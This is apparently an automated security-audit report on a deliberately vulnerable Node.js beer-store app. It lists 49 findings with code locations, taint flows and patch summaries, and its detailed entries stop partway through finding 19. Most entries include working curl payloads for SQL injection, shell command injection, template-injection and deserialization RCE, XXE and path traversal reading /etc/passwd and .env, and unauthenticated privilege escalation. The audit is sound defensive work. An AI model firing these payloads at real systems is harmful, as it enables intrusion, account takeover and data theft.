# Cerberus Report

**Findings:** 49 actionable — 14 critical, 25 high, 7 medium, 3 low
- Order: confirmed → needs-review, then severity, then confidence
- Omitted: 9 false positives and 1 duplicate — full triage record in `findings.json`

| Severity | Count | Proven PoCs | Patched |
| :--- | :---: | :---: | :---: |
| CRITICAL | 14 | 0 / 14 (0%) | 14 |
| HIGH | 25 | 0 / 25 (0%) | 25 |
| MEDIUM | 7 | 0 / 7 (0%) | 7 |
| LOW | 3 | 0 / 3 (0%) | 3 |
| **TOTAL** | **49** | **0 / 49 (0%)** | **49** |

## Table of Contents

- [Confirmed (49)](#confirmed)
  - [CRITICAL: SQL Injection in GET /v1/search/:filter/:query (`src/router/routes/order.js:65`)](#finding-1)
  - [CRITICAL: Missing Authentication on GET /v1/status/:brand Enables Unauthenticated RCE (`src/router/routes/system.js:13`)](#finding-2)
  - [CRITICAL: OS Command Injection in GET /v1/status/:brand (`src/router/routes/system.js:17`)](#finding-3)
  - [CRITICAL: Unauthenticated Vertical Privilege Escalation in PUT /v1/admin/promote/:id (`src/router/routes/user.js:356`)](#finding-4)
  - [CRITICAL: XXE via libxmljs noent:true in POST /v1/admin/new-beer-xml (`src/router/routes/admin.js:93`)](#finding-5)
  - [CRITICAL: SSTI in GET / via nunjucks.renderString (`src/router/routes/frontend.js:16`)](#finding-6)
  - [CRITICAL: SSTI in GET /register via nunjucks.renderString (`src/router/routes/frontend.js:39`)](#finding-7)
  - [CRITICAL: Path Traversal Arbitrary File Read in GET /v1/beer-pic (`src/router/routes/order.js:33`)](#finding-8)
  - [CRITICAL: Insecure Deserialization RCE in POST /v1/init (`src/router/routes/system.js:64`)](#finding-9)
  - [CRITICAL: Unrestricted File Upload in POST /v1/admin/upload-pic (`src/router/routes/admin.js:50`)](#finding-10)
  - [CRITICAL: Missing Authentication on POST /v1/init Deserialization Endpoint (`src/router/routes/system.js:61`)](#finding-11)
  - [CRITICAL: Mass Assignment to Admin Role and Plaintext Password in POST /v1/user (`src/router/routes/user.js:86`)](#finding-12)
  - [CRITICAL: Hardcoded Secret and Broken Password Check in POST /v1/user/token (`src/router/routes/user.js:251`)](#finding-13)
  - [CRITICAL: Mass Assignment BOLA in PUT /v1/user/:id (`src/router/routes/user.js:328`)](#finding-14)
  - [HIGH: Missing Authorization on POST /v1/admin/new-beer (`src/router/routes/admin.js:16`)](#finding-15)
  - [HIGH: IDOR in GET /v1/user/:id (`src/router/routes/user.js:52`)](#finding-16)
  - [HIGH: Broken Function-Level Authorization in DELETE /v1/user/:id (`src/router/routes/user.js:65`)](#finding-17)
  - [HIGH: Missing Authentication on POST /v1/admin/upload-pic (`src/router/routes/admin.js:51`)](#finding-18)
  - [HIGH: Missing Authentication on POST /v1/admin/new-beer-xml (`src/router/routes/admin.js:83`)](#finding-19)
  - [HIGH: Missing Authentication on GET /v1/order Exposes All Users and Beers (`src/router/routes/order.js:12`)](#finding-20)
  - [HIGH: SSRF in GET /v1/test (`src/router/routes/system.js:81`)](#finding-21)
  - [HIGH: Hardcoded JWT Secret in GET /v1/admin/users (`src/router/routes/user.js:18`)](#finding-22)
  - [HIGH: Hardcoded OTP Seed Default Enables OTP Prediction (`src/router/routes/user.js:395`)](#finding-23)
  - [HIGH: Reflected XSS via |safe in user-register.html (`src/templates/user-register.html:139`)](#finding-24)
  - [HIGH: Reflected XSS via |safe in user.html (`src/templates/user.html:139`)](#finding-25)
  - [HIGH: Missing Authentication on GET /v1/test SSRF Endpoint (`src/router/routes/system.js:75`)](#finding-26)
  - [HIGH: Credentials in URL and Weak MD5 Storage in GET /registerform (`src/router/routes/frontend.js:68`)](#finding-27)
  - [HIGH: Broken Authentication Bypass in GET /login (`src/router/routes/frontend.js:122`)](#finding-28)
  - [HIGH: IDOR in GET /profile (`src/router/routes/frontend.js:148`)](#finding-29)
  - [HIGH: Excessive Data Exposure in GET /v1/order (`src/router/routes/order.js:13`)](#finding-30)
  - [HIGH: Cross-Unit Stored XSS: POST /v1/user/ address to GET /profile |safe (`src/router/routes/user.js:87`)](#finding-31)
  - [HIGH: Broken Authorization Binding in POST /v1/love/:beer_id (`src/router/routes/user.js:182`)](#finding-32)
  - [HIGH: Broken Login and User Enumeration in POST /v1/user/login (`src/router/routes/user.js:299`)](#finding-33)
  - [HIGH: Missing Rate Limiting on OTP Validation Enables Brute-Force (`src/router/routes/user.js:381`)](#finding-34)
  - [HIGH: Broken OTP Validation with Seed Control and Token Leak (`src/router/routes/user.js:393`)](#finding-35)
  - [HIGH: Insecure Session Configuration with Hardcoded Secret (`src/server.js:57`)](#finding-36)
  - [HIGH: Stored XSS via |safe in beer.html (`src/templates/beer.html:136`)](#finding-37)
  - [HIGH: Stored XSS via |safe in profile.html (`src/templates/profile.html:136`)](#finding-38)
  - [HIGH: IDOR and Reflected XSS in GET /beer via relationship (`src/router/routes/frontend.js:212`)](#finding-39)
  - [MEDIUM: Open Redirect in GET /v1/redirect (`src/router/routes/system.js:37`)](#finding-40)
  - [MEDIUM: Credentials in URL Query in GET /login (`src/router/routes/frontend.js:110`)](#finding-41)
  - [MEDIUM: Unhandled Exception Hanging Response DoS in GET /v1/status/:brand (`src/router/routes/system.js:20`)](#finding-42)
  - [MEDIUM: Missing Response Hanging Request in POST /v1/init (`src/router/routes/system.js:61`)](#finding-43)
  - [MEDIUM: CSRF and IDOR in GET /v1/love/:beer_id (`src/router/routes/user.js:118`)](#finding-44)
  - [MEDIUM: Session Fixation in GET /login: No Session Regeneration on Authentication (`src/router/routes/frontend.js:126`)](#finding-45)
  - [MEDIUM: ReDoS via Nested-Quantifier Email Regex on Unauthenticated Endpoints (`src/router/routes/user.js:89`)](#finding-46)
  - [LOW: Verbose Database Error Disclosure in Search Endpoint (`src/router/routes/order.js:71`)](#finding-47)
  - [LOW: Missing Security Headers (CSP/HSTS/X-Frame) Disabled in Server (`src/server.js:19`)](#finding-48)
  - [LOW: Sensitive Error Disclosure in GET /v1/test SSRF Handler (`src/router/routes/system.js:89`)](#finding-49)

<a id="confirmed"></a>
## Confirmed (49)

<a id="finding-1"></a>
### CRITICAL SQL Injection in GET /v1/search/:filter/:query
- CVSS: **8.9** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-89 | confidence: 0.98
- Location: `src/router/routes/order.js:65-65`
- Vulnerable code (`src/router/routes/order.js`):
```javascript
const sql = "SELECT * FROM beers WHERE "+filter+" = '"+query+"';
```
- Taint Flow:
  - **Source**: `req.params.filter, req.params.query`
  - **Path**:
    - `req.params.filter/query -> sql -> sequelize.query`
  - **Sink**: `sequelize.query raw SQL`
- Evidence: const sql = "SELECT * FROM beers WHERE "+filter+" = '"+query+"';
  - Validation: src/router/routes/order.js:65 raw concat SELECT * FROM beers WHERE +filter+'='+query, sink src/router/routes/order.js:67 db.sequelize.query(sql,{type:'RAW'}) with no sanitizer, reachable unauth GET /v1/search/:filter/:query
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/order.js:65 raw concat SELECT * FROM beers WHERE +filter+'='+query, sink src/router/routes/order.js:67 db.sequelize.query(sql,{type:'RAW'}) with no sanitizer, reachable unauth GET /v1/search/:filter/:query | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl "http://localhost:5000/v1/search/id/1' OR '1'='1" ; sqlmap -u 'http://localhost:5000/v1/search/id/2*'
```
- Patch:
  - **Summary**: Allowlist filter to known columns and use parameterized replacements for query value; forbid raw string-interpolated sequelize.query

<a id="finding-2"></a>
### CRITICAL Missing Authentication on GET /v1/status/:brand Enables Unauthenticated RCE
- CVSS: **8.9** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.98
- Location: `src/router/routes/system.js:13-13`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
app.get('/v1/status/:brand', (req,res) =>{
```
- Taint Flow:
  - **Source**: `unauthenticated URL param :brand`
  - **Path**:
    - `src/router/routes/system.js:14 req.params.brand`
    - `src/router/routes/system.js:17 execSync curl`
  - **Sink**: `child_process.execSync shell command`
- Evidence: src/router/routes/system.js:13 route has no verifyToken/isAdmin/session check before execSync sink at line 17; prior missing-auth list covers init/test/upload-pic/new-beer-xml only
  - Validation: src/router/routes/system.js:13 GET /v1/status/:brand has no auth middleware; src/router/routes/system.js:17 execSync concatenates req.params.brand into shell
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:13 GET /v1/status/:brand has no auth middleware; src/router/routes/system.js:17 execSync concatenates req.params.brand into shell | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require auth and replace execSync shell string with allowlisted fetch/spawn without shell

<a id="finding-3"></a>
### CRITICAL OS Command Injection in GET /v1/status/:brand
- CVSS: **8.9** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-78 | confidence: 0.98
- Location: `src/router/routes/system.js:17-17`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
```
- Taint Flow:
  - **Source**: `req.params.brand`
  - **Path**:
    - `req.params.brand -> execSync string`
  - **Sink**: `child_process.execSync shell`
- Evidence: const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
  - Validation: src/router/routes/system.js:17 execSync("curl https://letmegooglethat.com/?q="+req.params.brand) unauth GET /v1/status/:brand with no escaping, only try/catch log
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:17 execSync("curl https://letmegooglethat.com/?q="+req.params.brand) unauth GET /v1/status/:brand with no escaping, only try/catch log | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/v1/status/bud|whoami' ; curl 'http://localhost:5000/v1/status/$(id)'
```
- Patch:
  - **Summary**: Remove shell construction; use allowlisted fetch (axios/fetch) with validated brand enum and execFile without shell if curl needed

<a id="finding-4"></a>
### CRITICAL Unauthenticated Vertical Privilege Escalation in PUT /v1/admin/promote/:id
- CVSS: **8.9** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.97
- Location: `src/router/routes/user.js:356-356`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const user = db.user.update({role:'admin'}, {
```
- Taint Flow:
  - **Source**: `req.params.id`
  - **Path**:
    - `req.params.id -> role admin update`
  - **Sink**: `privilege escalation`
- Evidence: const user = db.user.update({role:'admin'}, {
  - Validation: src/router/routes/user.js:356 db.user.update({role:'admin'},{where:{id:req.params.id}}) in PUT /v1/admin/promote/:id with no auth check; src/router/index.js:14 mounts routes with no middleware
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:356 db.user.update({role:'admin'},{where:{id:req.params.id}}) in PUT /v1/admin/promote/:id with no auth check; src/router/index.js:14 mounts routes with no middleware | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X PUT http://localhost:5000/v1/admin/promote/2  # becomes admin
```
- Patch:
  - **Summary**: Require authenticated admin (verified JWT role check) on PUT /v1/admin/promote/:id before role update

<a id="finding-5"></a>
### CRITICAL XXE via libxmljs noent:true in POST /v1/admin/new-beer-xml
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-611 | confidence: 0.96
- Location: `src/router/routes/admin.js:93-93`
- Vulnerable code (`src/router/routes/admin.js`):
```javascript
const doc = libxmljs.parseXml(xml, {noent: true});
```
- Taint Flow:
  - **Source**: `req.file.buffer (attacker XML)`
  - **Path**:
    - `req.file.buffer -> libxmljs.parseXml noent`
  - **Sink**: `libxmljs.parseXml with entity expansion`
- Evidence: const doc = libxmljs.parseXml(xml, {noent: true});
  - Validation: src/router/routes/admin.js:93 libxmljs.parseXml(xml,{noent:true}) where xml=req.file.buffer from unauth POST /v1/admin/new-beer-xml/
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/admin.js:93 libxmljs.parseXml(xml,{noent:true}) where xml=req.file.buffer from unauth POST /v1/admin/new-beer-xml/ | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -F file=@xxe.xml http://localhost:5000/v1/admin/new-beer-xml/ where xxe.xml contains <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
```
- Patch:
  - **Summary**: Set noent:false, disable external entities/DTD loading or reject DOCTYPE; keep authz on endpoint

<a id="finding-6"></a>
### CRITICAL SSTI in GET / via nunjucks.renderString
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-94 | confidence: 0.96
- Location: `src/router/routes/frontend.js:16-16`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
rendered = nunjucks.renderString(message);
```
- Taint Flow:
  - **Source**: `req.query.message on GET /`
  - **Path**:
    - `req.query.message -> nunjucks.renderString -> res.render`
  - **Sink**: `nunjucks template evaluation`
- Evidence: rendered = nunjucks.renderString(message);
  - Validation: src/router/routes/frontend.js:15 message=req.query.message + :17 nunjucks.renderString(message) unauth GET / then res.render
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:15 message=req.query.message + :17 nunjucks.renderString(message) unauth GET / then res.render | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/?message={{range.constructor("return+global.process.mainModule.require(\u0027child_process\u0027).execSync(\u0027id\u0027)")()}}'
```
- Patch:
  - **Summary**: Never renderString untrusted input; pass message as template variable with autoescape

<a id="finding-7"></a>
### CRITICAL SSTI in GET /register via nunjucks.renderString
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-94 | confidence: 0.96
- Location: `src/router/routes/frontend.js:39-39`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
rendered = nunjucks.renderString(message);
```
- Taint Flow:
  - **Source**: `req.query.message on GET /register`
  - **Path**:
    - `req.query.message -> renderString -> user-register.html`
  - **Sink**: `nunjucks evaluation`
- Evidence: rendered = nunjucks.renderString(message);
  - Validation: src/router/routes/frontend.js:39 nunjucks.renderString(req.query.message) in unauth GET /register then res.render user-register.html
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:39 nunjucks.renderString(req.query.message) in unauth GET /register then res.render user-register.html | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/register?message={{7*7}}'  # expect 49 if SSTI
```
- Patch:
  - **Summary**: Never renderString untrusted input; use static template with escaped variable

<a id="finding-8"></a>
### CRITICAL Path Traversal Arbitrary File Read in GET /v1/beer-pic
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-22 | confidence: 0.96
- Location: `src/router/routes/order.js:33-33`
- Vulnerable code (`src/router/routes/order.js`):
```javascript
fs.readFile(path.join(__dirname, filePath),function(err,data){
```
- Taint Flow:
  - **Source**: `req.query.picture`
  - **Path**:
    - `req.query.picture -> filePath -> path.join -> fs.readFile`
  - **Sink**: `fs.readFile arbitrary path`
- Evidence: fs.readFile(path.join(__dirname, filePath),function(err,data){
  - Validation: src/router/routes/order.js:27 filePath='../../../uploads/${req.query.picture}' + :33 fs.readFile(path.join(__dirname,filePath)); normalize commented out, only content-type branch on extension
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/order.js:27 filePath='../../../uploads/${req.query.picture}' + :33 fs.readFile(path.join(__dirname,filePath)); normalize commented out, only content-type branch on extension | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/v1/beer-pic/?picture=../.env' ; curl 'http://localhost:5000/v1/beer-pic/?picture=../../../../etc/passwd'
```
- Patch:
  - **Summary**: Canonicalize and constrain to uploads dir via basename/allowlist; reject traversal and absolute paths

<a id="finding-9"></a>
### CRITICAL Insecure Deserialization RCE in POST /v1/init
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-502 | confidence: 0.96
- Location: `src/router/routes/system.js:64-64`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
var deser = serialize.unserialize(body)
```
- Taint Flow:
  - **Source**: `req.body.object`
  - **Path**:
    - `req.body.object -> serialize.unserialize`
  - **Sink**: `node-serialize function evaluation`
- Evidence: var deser = serialize.unserialize(body)
  - Validation: src/router/routes/system.js:61 body=req.body.object + :64 serialize.unserialize(body) node-serialize func evaluation in unauth POST /v1/init
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:61 body=req.body.object + :64 serialize.unserialize(body) node-serialize func evaluation in unauth POST /v1/init | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST http://localhost:5000/v1/init -H 'Content-Type: application/json' -d '{"object":"{\"rce\":\"_$$ND_FUNC$$_function(){require(\u0027child_process\u0027).exec(\u0027id\u0027)}()\"}"}'
```
- Patch:
  - **Summary**: Remove node-serialize; use JSON.parse with schema validation, never unserialize untrusted objects

<a id="finding-10"></a>
### CRITICAL Unrestricted File Upload in POST /v1/admin/upload-pic
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-434 | confidence: 0.95
- Location: `src/router/routes/admin.js:50-51`
- Vulnerable code (`src/router/routes/admin.js`):
```javascript
const uploadImage = multer({ dest: './uploads/', })
```
- Taint Flow:
  - **Source**: `req.file (untrusted file bytes)`
  - **Path**:
    - `multipart file -> multer dest -> res.json(image)`
  - **Sink**: `filesystem write to ./uploads/`
- Evidence: const uploadImage = multer({ dest: './uploads/', })
  - Validation: src/router/routes/admin.js:50 multer({dest:'./uploads/'}) + :51 app.post('/v1/admin/upload-pic/') with no auth, fileFilter, type/size checks; writes attacker bytes to server filesystem
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/admin.js:50 multer({dest:'./uploads/'}) + :51 app.post('/v1/admin/upload-pic/') with no auth, fileFilter, type/size checks; writes attacker bytes to server filesystem | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -F file=@/etc/passwd http://localhost:5000/v1/admin/upload-pic/
```
- Patch:
  - **Summary**: Require admin auth, validate MIME/extension/size, randomize names, store outside webroot with no-exec

<a id="finding-11"></a>
### CRITICAL Missing Authentication on POST /v1/init Deserialization Endpoint
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.95
- Location: `src/router/routes/system.js:61-61`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
app.post('/v1/init', (req,res) =>{
```
- Taint Flow:
  - **Source**: `unauthenticated POST body`
  - **Path**:
    - `src/router/routes/system.js:63 req.body.object`
  - **Sink**: `serialize.unserialize RCE without auth`
- Evidence: src/router/routes/system.js:61 POST /v1/init performs node-serialize unserialize with no auth middleware; grep shows no route imports authJwt/verifySignup
  - Validation: src/router/routes/system.js:61 POST /v1/init has no auth; src/router/routes/system.js:64 serialize.unserialize(req.body.object) reachable unauthenticated
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:61 POST /v1/init has no auth; src/router/routes/system.js:64 serialize.unserialize(req.body.object) reachable unauthenticated | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require admin auth and replace node-serialize.unserialize with JSON.parse/safe schema

<a id="finding-12"></a>
### CRITICAL Mass Assignment to Admin Role and Plaintext Password in POST /v1/user
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-915 | confidence: 0.95
- Location: `src/router/routes/user.js:86-86`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const userRole = req.body.role
```
- Taint Flow:
  - **Source**: `req.body`
  - **Path**:
    - `req.body.role -> db.user.create`
  - **Sink**: `role escalation + plaintext storage`
- Evidence: const userRole = req.body.role
  - Validation: src/router/routes/user.js:84-102 POST /v1/user/ takes const userRole=req.body.role and password:userPassword plaintext directly into db.user.create with no auth
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:84-102 POST /v1/user/ takes const userRole=req.body.role and password:userPassword plaintext directly into db.user.create with no auth | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST http://localhost:5000/v1/user/ -H 'Content-Type: application/json' -d '{"email":"a@b.com","password":"p","name":"x","role":"admin"}'
```
- Patch:
  - **Summary**: Ignore client-supplied role (force 'user' or admin-only promote) and hash password with bcrypt before create.
  - +1 duplicate(s): `src/router/routes/user.js:85`

<a id="finding-13"></a>
### CRITICAL Hardcoded Secret and Broken Password Check in POST /v1/user/token
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-798 | confidence: 0.95
- Location: `src/router/routes/user.js:251-251`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const jwtTokenSecret = "SuperSecret"
```
- Taint Flow:
  - **Source**: `req.body.email/password`
  - **Path**:
    - `req.body.password vs stored -> jwt.sign -> res.json user`
  - **Sink**: `JWT issuance + user disclosure`
- Evidence: const jwtTokenSecret = "SuperSecret"
  - Validation: src/router/routes/user.js:248-251 hardcoded jwtTokenSecret SuperSecret + broken compare; src/router/routes/user.js:245 flawed (stored==input)||(md5(stored)==input) and res.json leaks user incl hash
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:248-251 hardcoded jwtTokenSecret SuperSecret + broken compare; src/router/routes/user.js:245 flawed (stored==input)||(md5(stored)==input) and res.json leaks user incl hash | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST http://localhost:5000/v1/user/token -H 'Content-Type: application/json' -d '{"email":"victim@x.com","password":"<leaked-md5>"}'
```
- Patch:
  - **Summary**: Verify with bcrypt/md5(input)==stored, use strong random JWT secret from env with jwt.verify, and strip password/hash from response.

<a id="finding-14"></a>
### CRITICAL Mass Assignment BOLA in PUT /v1/user/:id
- CVSS: **8.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-915 | confidence: 0.95
- Location: `src/router/routes/user.js:328-328`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const user = db.user.update(req.body, {
```
- Taint Flow:
  - **Source**: `req.body + req.params.id`
  - **Path**:
    - `req.body -> db.user.update`
  - **Sink**: `arbitrary field update`
- Evidence: const user = db.user.update(req.body, {
  - Validation: src/router/routes/user.js:328 db.user.update(req.body,{where:{id:req.params.id}}) unauthenticated with no allowlist; mounted via src/router/index.js:3-9
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:328 db.user.update(req.body,{where:{id:req.params.id}}) unauthenticated with no allowlist; mounted via src/router/index.js:3-9 | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X PUT http://localhost:5000/v1/user/2 -H 'Content-Type: application/json' -d '{"role":"admin","password":"pwned"}'
```
- Patch:
  - **Summary**: Require auth + ownership/admin check on PUT /v1/user/:id and whitelist updatable fields (block role/password) with explicit field mapping.

<a id="finding-15"></a>
### HIGH Missing Authorization on POST /v1/admin/new-beer
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.96
- Location: `src/router/routes/admin.js:16-16`
- Vulnerable code (`src/router/routes/admin.js`):
```javascript
app.post('/v1/admin/new-beer/', (req,
```
- Taint Flow:
  - **Source**: `req.body (unauthenticated JSON)`
  - **Path**:
    - `req.body.name -> db.beer.create`
  - **Sink**: `db.beer.create with attacker data, no authz`
- Evidence: app.post('/v1/admin/new-beer/', (req,
  - Validation: src/router/routes/admin.js:16 app.post('/v1/admin/new-beer/') calls db.beer.create(req.body) with no auth; src/router/index.js:14 mounts with no authJwt middleware
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/admin.js:16 app.post('/v1/admin/new-beer/') calls db.beer.create(req.body) with no auth; src/router/index.js:14 mounts with no authJwt middleware | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST http://localhost:5000/v1/admin/new-beer/ -H 'Content-Type: application/json' -d '{"name":"xss\"<script>alert(1)</script>","price":1,"picture":"a"}'
```
- Patch:
  - **Summary**: Enforce authentication + admin role authorization middleware on all /v1/admin/* routes

<a id="finding-16"></a>
### HIGH IDOR in GET /v1/user/:id
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-639 | confidence: 0.96
- Location: `src/router/routes/user.js:52-52`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
db.user.findOne({include: 'beers',where: { id : req.params.id}})
```
- Taint Flow:
  - **Source**: `req.params.id`
  - **Path**:
    - `req.params.id -> findOne -> res.json`
  - **Sink**: `user record disclosure`
- Evidence: db.user.findOne({include: 'beers',where: { id : req.params.id}})
  - Validation: src/router/routes/user.js:52 db.user.findOne({where:{id:req.params.id}}) in GET /v1/user/:id with no auth/ownership check, returns full user incl password hash
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:52 db.user.findOne({where:{id:req.params.id}}) in GET /v1/user/:id with no auth/ownership check, returns full user incl password hash | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl http://localhost:5000/v1/user/1 ; curl http://localhost:5000/v1/user/2
```
- Patch:
  - **Summary**: Require auth and enforce requester-id==target or admin; minimize returned fields

<a id="finding-17"></a>
### HIGH Broken Function-Level Authorization in DELETE /v1/user/:id
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.96
- Location: `src/router/routes/user.js:65-65`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
db.user.destroy({where: { id : req.params.id}})
```
- Taint Flow:
  - **Source**: `req.params.id`
  - **Path**:
    - `req.params.id -> destroy`
  - **Sink**: `arbitrary account deletion`
- Evidence: db.user.destroy({where: { id : req.params.id}})
  - Validation: src/router/routes/user.js:65 db.user.destroy({where:{id:req.params.id}}) in DELETE /v1/user/:id with no auth check; mounted unauth via src/router/index.js:14
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:65 db.user.destroy({where:{id:req.params.id}}) in DELETE /v1/user/:id with no auth check; mounted unauth via src/router/index.js:14 | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X DELETE http://localhost:5000/v1/user/2
```
- Patch:
  - **Summary**: Require auth and enforce self-or-admin authorization before destroy

<a id="finding-18"></a>
### HIGH Missing Authentication on POST /v1/admin/upload-pic
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.95
- Location: `src/router/routes/admin.js:51-51`
- Vulnerable code (`src/router/routes/admin.js`):
```javascript
app.post('/v1/admin/upload-pic/', uploadImage.single('file'), async function (req, res) {
```
- Taint Flow:
  - **Source**: `unauthenticated multipart file request to /v1/admin/upload-pic/`
  - **Path**:
    - `src/router/routes/admin.js:51 POST /v1/admin/upload-pic/ entry, no auth check`
    - `src/router/routes/admin.js:60 res.json(image) file persisted via multer dest ./uploads/`
  - **Sink**: `server filesystem write via multer + metadata disclosure`
- Evidence: src/router/routes/admin.js:51 defines POST /v1/admin/upload-pic/ with only multer middleware; no authJwt.verifyToken/isAdmin imported or used in file (requires only os/multer/hoek); sibling GET /v1/admin/users/ in user.js:15 does a JWT check but this admin upload route has none
  - Validation: src/router/routes/admin.js:51 POST /v1/admin/upload-pic/ registers only multer middleware with no auth check; imports only os/multer/hoek
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/admin.js:51 POST /v1/admin/upload-pic/ registers only multer middleware with no auth check; imports only os/multer/hoek | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require authenticated admin middleware (verifyToken/isAdmin) before multer handling on /v1/admin/upload-pic/

<a id="finding-19"></a>
### HIGH Missing Authentication on POST /v1/admin/new-beer-xml
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.95
- Location: `src/router/routes/admin.js:83-83`
- Vulnerable code (`src/router/routes/admin.js`):
```javascript
